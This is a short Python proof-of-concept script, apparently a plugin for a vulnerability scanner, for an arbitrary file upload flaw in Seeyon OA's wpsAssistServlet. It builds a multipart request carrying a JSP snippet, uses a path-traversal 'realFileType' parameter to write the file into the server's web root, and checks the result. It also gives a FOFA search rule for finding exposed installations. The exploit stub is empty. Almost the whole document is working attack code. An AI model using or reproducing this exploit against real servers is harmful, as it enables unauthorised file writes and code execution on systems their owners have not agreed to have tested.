#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import random
import re
from Config.config_requests import headers
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='Seeyon_OA_wpsAssistServlet_upload'
AUTHOR="CSeroad"
REMARK='致远OA wpsAssistServlet 任意文件上传'
FOFA_RULE='title="致远A8+协同管理软件.A6"'
######################################################

headers = {'User-Agent': ua,
           'Content-Type': 'multipart/form-data; boundary=-***'}

def poc(target):
    result = {}
    data = '''
---***
Content-Disposition: form-data; name="upload"; filename=""\r\nContent-Type: image/jpeg\r\n\r\n<% out.println("loglog");%>\r\n---***--'''
    vuln_url = target + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/logs.txt&fileId=2"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        requests.post(url=vuln_url,headers=headers,data=data,timeout=5, verify=False)
        r1 = requests.get(url = target+"/logs.txt")
        if 'loglog' in r1.text and r1.status_code == 200:
            result['target'] = target
            result['poc'] = NAME
            result['vuln_url'] = target+"/logs.txt"
            return result
        else:
            pass
    except Exception as e:
        pass

def exp(target):
    pass


if __name__ == '__main__':
    poc("https://127.0.0.1")